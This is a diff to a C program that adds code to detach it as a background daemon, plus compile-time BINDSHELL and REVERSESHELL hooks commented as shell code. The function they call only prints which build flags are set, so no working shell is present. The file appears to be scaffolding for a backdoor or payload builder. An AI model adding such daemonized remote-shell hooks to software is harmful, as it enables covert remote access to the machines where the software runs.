@@ -1,11 +1,82 @@
 //#define IPADDR "192.168.1.1"
 
 #include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <fcntl.h>
 #include <errno.h>
-extern int errno;
+#include <unistd.h>
+#include <syslog.h>
+#include <string.h>
+#include <curl/curl.h>
+
+void foo();
+
+int main(void) {
+
+        /* Our process ID and Session ID */
+        pid_t pid, sid;
+
+        /* Fork off the parent process */
+        pid = fork();
+        if (pid < 0) {
+                exit(EXIT_FAILURE);
+        }
+        /* If we got a good PID, then
+           we can exit the parent process. */
+        if (pid > 0) {
+                exit(EXIT_SUCCESS);
+        }
+
+        /* Change the file mode mask */
+        umask(0);
+
+        /* Open any logs here */
+
+        /* Create a new SID for the child process */
+        sid = setsid();
+        if (sid < 0) {
+                /* Log the failure */
+                exit(EXIT_FAILURE);
+        }
 
 
-int main (int argc, char const *argv[])
+
+        /* Change the current working directory */
+        if ((chdir("/")) < 0) {
+                /* Log the failure */
+                exit(EXIT_FAILURE);
+        }
+
+        /* Close out the standard file descriptors */
+        //close(STDIN_FILENO);
+        //close(STDOUT_FILENO);
+        //close(STDERR_FILENO);
+
+        /* Daemon-specific initialization goes here */
+
+        /* The Big Loop */
+        //while (1) {
+           /* Do some task here ... */
+           #ifdef BINDSHELL
+           foo(); //bindshell code
+           //break;
+           #endif
+
+           #ifdef REVERSESHELL
+           foo(); //reverseshell code
+           //break;
+           #endif
+
+           //sleep(30); /* wait 30 seconds */
+        //}
+  //VALIDATOR!!!!!!!!!!!!!!!!!!!
+   exit(EXIT_SUCCESS);
+}
+
+
+void foo()
 {
   #ifdef DEBUG
   printf("Error occurred!\n");
@@ -77,6 +148,10 @@ int main (int argc, char const *argv[])
   printf("LOADSHELLCODE: %d!\n", LOADSHELLCODE);
   #endif
 
+  #ifdef BINDSHELL
+  printf("BINDSHELL: %d!\n", BINDSHELL);
+  #endif
+
   #ifdef REVERSESHELL
   printf("REVERSESHELL: %d!\n", REVERSESHELL);
   #endif
@@ -104,6 +179,4 @@ int main (int argc, char const *argv[])
   #ifdef STATIC
   printf("STATIC: %d!\n", STATIC);
   #endif
-
-  return 0;
 }
